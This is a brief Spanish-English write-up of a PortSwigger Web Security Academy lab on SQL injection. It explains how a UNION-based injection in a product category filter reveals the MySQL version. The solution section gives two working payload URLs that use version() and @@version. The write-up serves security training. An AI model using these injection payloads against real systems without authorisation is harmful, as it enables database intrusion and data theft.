# `LAB`: SQL injection attack, querying the database type and version on MySQL and Microsoft

## Descripción:

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 

### Oracle Cheastsheet:

- [PortSwigger - SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


---

### Explicación:

En realidad esta es una inyección sencilla que solo pide la versión de la DB `MySQL` donde se pueden usar los payloads:

1. `version()`
2. `@@version`


## Solución:

````py
## SQLi: Dumpear Version opt.1
.web-security-academy.net/filter?category=Pets' Union Select 1,version() -- -

## SQLi: Dumpear Version opt.1
.web-security-academy.net/filter?category=Pets' Union Select 1,@@version -- -
````
